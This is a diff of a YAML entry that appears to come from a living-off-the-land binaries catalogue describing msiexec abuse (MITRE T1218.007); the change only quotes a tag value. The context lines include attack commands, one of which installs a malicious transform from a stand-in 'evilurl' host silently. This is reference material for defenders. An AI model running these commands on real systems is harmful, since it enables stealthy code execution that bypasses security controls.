@@ -25,7 +25,7 @@ Commands:
     Privileges: User
     MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags: [DLL]
+    Tags: ['DLL']
   - Command: msiexec /z "C:\folder\evil.dll"
     Description: Calls DLLUnregisterServer to un-register the target DLL.
     Usecase: Execute dll files
@@ -33,7 +33,7 @@ Commands:
     Privileges: User
     MitreID: T1218.007
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-    Tags: [DLL]
+    Tags: ['DLL']
   - Command: msiexec /i "https://trustedURL/signed.msi" TRANSFORMS="https://evilurl/evil.mst" /qb
     Description: Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a Transformfile will be used, which can contains malicious code or binaries. The /qb will skip user input.
     Usecase: Install trusted and signed msi file, with additional attack code as Treansorm file, from remote server
